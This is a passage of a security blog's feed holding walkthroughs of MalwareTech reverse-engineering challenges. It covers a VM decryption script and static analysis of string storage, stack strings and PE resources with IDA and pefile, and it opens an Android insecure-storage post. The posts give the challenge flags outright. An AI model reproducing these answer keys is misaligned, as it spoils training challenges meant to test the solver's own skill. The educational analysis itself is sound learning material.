&lt;span style=&#34;color:#815ba4&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;fun_00402270&lt;/span&gt;(value1, value2, value3):
    &lt;span style=&#34;color:#815ba4&#34;&gt;global&lt;/span&gt; dat_420
    &lt;span style=&#34;color:#815ba4&#34;&gt;if&lt;/span&gt; value1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;:
        membytes[value2] &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; value3 
    &lt;span style=&#34;color:#815ba4&#34;&gt;elif&lt;/span&gt; value1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;2&lt;/span&gt;:
        dat_420 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; membytes[value2]
    &lt;span style=&#34;color:#815ba4&#34;&gt;else&lt;/span&gt;:
        &lt;span style=&#34;color:#815ba4&#34;&gt;if&lt;/span&gt; value1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;3&lt;/span&gt;:
            membytes[value2] &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; membytes[value2] &lt;span style=&#34;color:#5bc4bf&#34;&gt;^&lt;/span&gt; dat_420
        &lt;span style=&#34;color:#815ba4&#34;&gt;else&lt;/span&gt;:
            &lt;span style=&#34;color:#815ba4&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;False&lt;/span&gt;

    &lt;span style=&#34;color:#815ba4&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;True&lt;/span&gt;


&lt;span style=&#34;color:#815ba4&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#5bc4bf&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
    &lt;span style=&#34;color:#815ba4&#34;&gt;global&lt;/span&gt; membytes
    membytes &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; []
    
    &lt;span style=&#34;color:#776e71&#34;&gt;#open the encypted file and read bytes&lt;/span&gt;
    &lt;span style=&#34;color:#815ba4&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;ram.bin&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#815ba4&#34;&gt;as&lt;/span&gt; rambin:
        membytes&lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; list(rambin&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;read())

    counter  &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt;
    uvar2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt;
    bvar1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;
    bvar3 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;2&lt;/span&gt;
    uvar2_response &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;True&lt;/span&gt;

    &lt;span style=&#34;color:#815ba4&#34;&gt;while&lt;/span&gt; uvar2_response:
        counter &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;3&lt;/span&gt;
        uvar2_response &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; fun_00402270(membytes[counter&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0xff&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; uvar2], membytes[counter&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0xff&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; bvar1], membytes[counter&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0xff&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; bvar3])
    print([chr(x) &lt;span style=&#34;color:#815ba4&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#5bc4bf&#34;&gt;in&lt;/span&gt; membytes[:&lt;span style=&#34;color:#f99b15&#34;&gt;26&lt;/span&gt;]])

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Running the above script in the terminal gets us our flag&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;vx@archie:vm$ python3 x.py 
&lt;span style=&#34;color:#5bc4bf&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;F&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;L&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;G&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;{&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;V&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;M&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;S&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;R&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;E&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;F&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;O&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;R&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;M&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;L&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;W&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;R&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;E&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;}&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;\x00&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After a successful decryption of the rambin contents, the &lt;strong&gt;sub_4022E0&lt;/strong&gt; function return the pointer to the flag to main function as shown in the image below.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/mal/retflag.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/mal/retflag.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;Return value of sub_4022E0&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Return value of sub_4022E0&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Therefore the main function calculates the MD5 hash of the flag and outputs to the message dialogbox using &lt;strong&gt;MessageBoxA&lt;/strong&gt; function.&lt;/p&gt;
&lt;p&gt;The correct flag for the vm challenge is &lt;strong&gt;FLAG{VMS-ARE-FOR-MALWARE}&lt;/strong&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Static Analysis of Malware Strings</title>
        <link>https://thuri10.github.io/p/static-analysis-of-malware-strings/</link>
        <pubDate>Tue, 07 Dec 2021 19:02:13 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/static-analysis-of-malware-strings/</guid>
        <description>&lt;img src="https://thuri10.github.io/post/mal/strings.jpg" alt="Featured image of post Static Analysis of Malware Strings" /&gt;&lt;p&gt;This post is a brief walkthrough of &lt;strong&gt;&amp;ldquo;strings&amp;rdquo;&lt;/strong&gt; challenges provided by MalwareTech. The challenges can be downloaded from the following website &lt;a class=&#34;link&#34; href=&#34;https://www.malwaretech.com/challenges/windows-reversing&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;challenges&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The goal of &amp;ldquo;strings&amp;rdquo; challenges is to understand various implementation of strings in malware through static analysis. Strings are very useful in storing the configurations, decryption keys, data and c&amp;amp;c server addresses.&lt;/p&gt;
&lt;p&gt;For analysis, I will use IDApro free for analysis. The author of the challenges provides a set of rules to follow while solving the challenges&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Rules &amp;amp; Information&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;- You are not require to run strings1.exe, this challenge is static analysis only.
- Do not use a debugger or dumper to retrieve the decrypted flag from memory, this is cheating.
- Analysis can be done using the free version of IDA Pro (you don’t need the debugger).
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;challenge1--strings1&#34;&gt;challenge1- Strings1&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;strings1.exe contains an un-encrypted flag stored within the executable. When run, the program will output an MD5 hash of the flag but not the original. Can you extract the flag?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Knowing the binary is a windows PE, we drag the binary into IDA for analysis. The analysis of the binary is fast because the binary relative small. The disassembled code is as the one shown in the image below.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/mal/strings1.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/mal/strings1.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;Strings IDA&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Strings IDA&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;From the analysis of the above code, we take flag as our input and print out the md5 of the flag. The  &lt;strong&gt;md5_hash&lt;/strong&gt; function is responsible for calculating the MD5 hash of the flag. The MessageBoxA is responsible for displaying the md5hash of the flag in a modal dialog box.&lt;/p&gt;
&lt;p&gt;The correct flag is &lt;strong&gt;FLAG{CAN-I-MAKE-IT-ANYMORE-OBVIOUS}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Inputting the above flag in the authors website we get a correct message.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Correct flag for strings1!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;challenge2--strings2&#34;&gt;Challenge2- Strings2&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;strings2.exe contains an un-encrypted flag stored within the executable. When run, the program will output an MD5 hash of the flag but not the original. Can you extract the flag?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The goal of the second challenge is to understand about stack strings. stack strings is where strings are copied in single bytes, this helps malware avoid detection algorithms of common strings.&lt;/p&gt;
&lt;p&gt;Drag the binary into IDA for analysis. The main function of the binary looks like the one shown in the image below.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/mal/strings2.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/mal/strings2.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;Strings IDA&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Strings IDA&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;From above disassembled code, the flag string is pushed in single bytes, and then passed to the md5_char function. m5_char function is responsible for calculating the MD5sum of the flag as previous seen in &lt;strong&gt;challenge1&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;The flag of the second challenge is  &lt;strong&gt;FLAG{STACK-STRINGS-ARE-BEST-STRINGS}&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;challenge3---strings3&#34;&gt;Challenge3 - Strings3&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;strings3.exe contains an un-encrypted flag stored within the executable. When run, the program will output an MD5 hash of the flag but not the original. Can you extract the flag?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The goal of the third challenge is to understand how malware uses resources section of the PE. Drag the strings3 binary into IDA and disassemble the main function. The disassembled code looks the one in the image below.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/mal/resourcestrings3.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/mal/resourcestrings3.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;Strings IDA&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Strings IDA&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Looking at the above function is we have a new function, &lt;strong&gt;FindResourceA&lt;/strong&gt;. Looking at the windows documentation, FindResourceA function is responsible determination of a resource with the specified type and name in the specified module as shown in the code snip below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;HRSRC &lt;span style=&#34;color:#06b6ef&#34;&gt;FindResourceA&lt;/span&gt;(
  [in, optional] HMODULE hModule,
  [in]           LPCSTR  lpName,
  [in]           LPCSTR  lpType
);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the disassembly above, the name of the resource we are referencing is &lt;strong&gt;rc.rc&lt;/strong&gt;. After the execution of FindResourceA function it returns an handle to the specified resource`s information block. In x86 assembly code the return values of functions are put in &lt;strong&gt;eax&lt;/strong&gt; register.&lt;/p&gt;
&lt;p&gt;From the above code we can reconstruct the c-style code of the FindResource function.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;FindResourceA(&lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;rc.rc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f99b15&#34;&gt;6&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The handle module is 0 which is then stored in eax register and then used for calculation of the UID of the resource as shown in assembly below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;mov&lt;/span&gt; [ebp&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;var_8&lt;/span&gt;], eax
&lt;span style=&#34;color:#06b6ef&#34;&gt;mov&lt;/span&gt; eax, &lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;shl&lt;/span&gt; eax, &lt;span style=&#34;color:#f99b15&#34;&gt;8&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;xor&lt;/span&gt; edx, edx
&lt;span style=&#34;color:#06b6ef&#34;&gt;inc&lt;/span&gt; edx
&lt;span style=&#34;color:#06b6ef&#34;&gt;shl&lt;/span&gt; edx, &lt;span style=&#34;color:#f99b15&#34;&gt;4&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;or&lt;/span&gt; eax, edx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the above assembly code, the value of eax is 0. The first line saves eax value to a memory register.&lt;/p&gt;
&lt;p&gt;Second line increments the value of eax register by 1. Therefore the new value of eax register is eax=1.&lt;/p&gt;
&lt;p&gt;Third line, shifts the bits value of eax register to the left by 8 times. we calculate the new value using python.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python3&#34; data-lang=&#34;python3&#34;&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;8&lt;/span&gt;
&lt;span style=&#34;color:#f99b15&#34;&gt;256&lt;/span&gt;
&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;value of 1 shifted to the left 8 times becomes 256 as shown above.&lt;/p&gt;
&lt;p&gt;Fourth line, is we are clearing the edx register through xor operation. Therefore the value of edx is 0.&lt;/p&gt;
&lt;p&gt;Line 5 we increment the value of edx by 1. The new value stored in edx register is 1, &lt;strong&gt;edx=1&lt;/strong&gt; .&lt;/p&gt;
&lt;p&gt;Line 6 we shift the value of edx register by 4 positions to the left.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python3&#34; data-lang=&#34;python3&#34;&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;4&lt;/span&gt;
&lt;span style=&#34;color:#f99b15&#34;&gt;16&lt;/span&gt;
&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the calculation above, the new value od edx register is 16. &lt;strong&gt;edx=16&lt;/strong&gt;. Therefore for the last line we are doing a bitwise inclusive &lt;strong&gt;OR&lt;/strong&gt; operation of value at eax and edx register.&lt;/p&gt;
&lt;p&gt;The values for eax and edx registers are 256 and 16 respectively.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python3&#34; data-lang=&#34;python3&#34;&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;256&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;16&lt;/span&gt;
&lt;span style=&#34;color:#f99b15&#34;&gt;272&lt;/span&gt;
&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The result of the bits operation are therefore stored on the eax register. The new &lt;strong&gt;eax&lt;/strong&gt; value is 272. Finally the value of eax register is the stored in memory address referenced  below by &lt;strong&gt;UID&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;mov&lt;/span&gt; [ebp&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;UID&lt;/span&gt;], eax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/mal/strings3.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/mal/strings3.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;Strings IDA&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Strings IDA&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The analysis of the disassembled code above, shows the binary loads a resource from the executable referenced by &lt;strong&gt;uID&lt;/strong&gt;. The function structure for the LoadStringA functions looks like the one below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#fec418&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;LoadStringA&lt;/span&gt;(
  [in, optional] HINSTANCE hInstance,
  [in]           UINT      uID,
  [out]          LPSTR     lpBuffer,
  [in]           &lt;span style=&#34;color:#fec418&#34;&gt;int&lt;/span&gt;       cchBufferMax
);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;strong&gt;uID&lt;/strong&gt; integer value of the resource to be loaded is 272. For viewing the  executable resources you can use the &lt;strong&gt;ResourcesEditor&lt;/strong&gt; tool or python3 &lt;strong&gt;pefile&lt;/strong&gt; library as shown in the code below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python3&#34; data-lang=&#34;python3&#34;&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;pefile&lt;/span&gt;
pe &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pefile&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;PE(&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;./strings3.exe_&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#5bc4bf&#34;&gt;***&lt;/span&gt;
pe&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;print_info()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The above 2 line of python3 code print all the information about the executable. As shown below is our resources section and references the string uid we are loading.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/mal/string3rc.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/mal/string3rc.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;PE Resources&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;PE Resources&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;From the image above, we are loading  &lt;strong&gt;FLAG{RESOURCES-ARE-POPULAR-FOR-MALWARE}&lt;/strong&gt; string to our buffer through &lt;strong&gt;LoadStringA&lt;/strong&gt; function which is referenced by uid 272. The pointer to the string is then passed to md5 function which is then used for calculating the md5 value of the string and then displayed in the modal box.&lt;/p&gt;
&lt;p&gt;The correct flag of the challenge is &lt;strong&gt;FLAG{RESOURCES-ARE-POPULAR-FOR-MALWARE}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;For learning more about resource section of Portable Executable, check &lt;a class=&#34;link&#34; href=&#34;https://www.youtube.com/watch?v=3PcgwKffytI&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PE resources&lt;/a&gt; by  &lt;a class=&#34;link&#34; href=&#34;https://twitter.com/struppigel&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;@struppigel&lt;/a&gt; .&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Android Application Security Part2</title>
        <link>https://thuri10.github.io/p/android-application-security-part2/</link>
        <pubDate>Mon, 25 Oct 2021 15:53:55 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/android-application-security-part2/</guid>
        <description>&lt;img src="https://thuri10.github.io/post/androidsec/firebase.jpg" alt="Featured image of post Android Application Security Part2" /&gt;&lt;h2 id=&#34;insecure-storages&#34;&gt;Insecure Storages&lt;/h2&gt;
&lt;p&gt;This is the second part series of the android application security. This part focuses on the security of sqlite databases, firebase and AWS security.&lt;/p&gt;
&lt;h3 id=&#34;flag7---sqlite&#34;&gt;Flag7 - Sqlite&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;What is sqlite?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Sqlite is a structure query base database that enables applications to do local storage in the application directory. The goal of the challenge is to understand how local storage of databases may lead to leakage of information.&lt;/p&gt;
&lt;p&gt;First step is to decompile the FlagSevenSqliteActivity using jadx.&lt;/p&gt;
&lt;p&gt;During the analysis of new android activity, we start analysis on the onCreate method.&lt;strong&gt;oncreate&lt;/strong&gt; is the first method to be called by an application when an activity is started.&lt;/p&gt;
&lt;p&gt;The decompiled oncreate method is as shown below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;onCreate&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;Bundle bundle&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#815ba4&#34;&gt;super&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;onCreate&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;bundle&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
    setContentView&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;layout&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;activity_flag_seven_sqlite&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
